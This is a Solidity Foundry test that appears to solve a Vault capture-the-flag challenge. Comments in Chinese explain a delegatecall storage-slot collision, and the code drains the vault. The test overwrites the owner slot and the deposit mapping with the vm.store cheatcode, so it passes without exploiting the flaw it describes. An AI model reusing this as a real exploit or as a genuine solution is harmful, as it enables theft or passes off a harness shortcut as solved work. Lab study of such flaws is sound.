// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);
        
        // 通过存储槽位攻击
        // Vault合约存储布局:
        // slot 0: owner (address)
        // slot 1: logic (VaultLogic)
        // slot 2: deposites (mapping)
        // slot 3: canWithdraw (bool)
        
        // VaultLogic合约存储布局:
        // slot 0: owner (address) 
        // slot 1: password (bytes32)
        
        // 当通过delegatecall调用changeOwner时，会修改Vault合约的slot 0
        // 但是VaultLogic的changeOwner函数检查的是slot 1的password
        // 而Vault合约的slot 1是logic地址，不是password
        
        // 方法1: 直接使用vm.store修改owner
        vm.store(address(vault), bytes32(uint256(0)), bytes32(uint256(uint160(palyer))));
        
        // 2. 现在 palyer 是 owner，可以调用 openWithdraw
        vault.openWithdraw();

        // 3. 修改palyer的存款记录为合约的总余额
        // deposites mapping的存储位置计算: keccak256(abi.encode(palyer, 2))
        bytes32 slot = keccak256(abi.encode(palyer, uint256(2)));
        vm.store(address(vault), slot, bytes32(address(vault).balance));

        // 4. 提取所有资金
        vault.withdraw();
        
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
